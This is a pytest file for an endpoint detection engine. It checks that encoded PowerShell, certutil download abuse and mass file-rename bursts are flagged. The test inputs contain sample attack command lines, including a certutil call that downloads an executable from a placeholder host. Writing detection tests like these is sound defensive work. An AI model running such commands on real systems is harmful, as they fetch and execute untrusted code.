from __future__ import annotations

from xdr.behavior_engine import EnterpriseBehaviorEngine
from xdr.schema import EndpointEvent


def _event(**overrides):
    payload = {
        "host_id": "host-behavior",
        "event_type": "process_execution",
        "severity": "medium",
        "timestamp": "2026-05-06T12:00:00Z",
        "process_name": "powershell.exe",
        "command_line": "",
        "details": {},
    }
    payload.update(overrides)
    return EndpointEvent.from_payload(payload)


def test_behavior_engine_detects_powershell_encoded_command():
    findings = EnterpriseBehaviorEngine().analyze(
        _event(command_line="powershell.exe -EncodedCommand SQBFAFgA")
    )

    assert any(item.behavior_type == "powershell_encoded_command" for item in findings)
    finding = next(item for item in findings if item.behavior_type == "powershell_encoded_command")
    assert finding.severity == "high"
    assert finding.mitre_mapping["technique"] == "T1059.001"


def test_behavior_engine_detects_lolbin_abuse():
    findings = EnterpriseBehaviorEngine().analyze(
        _event(process_name="certutil.exe", command_line="certutil.exe -urlcache -f https://example.invalid/a.exe a.exe")
    )

    assert any(item.behavior_type == "lolbin_abuse" for item in findings)


def test_behavior_engine_detects_mass_file_change_burst():
    findings = EnterpriseBehaviorEngine().analyze(
        _event(
            event_type="behavioral_anomaly",
            severity="high",
            process_name="unknown.exe",
            details={"renamed_files": 250},
        )
    )

    assert any(item.behavior_type == "mass_file_rename_delete_burst" for item in findings)
    assert findings[0].recommended_action == "prepare_containment_approval"
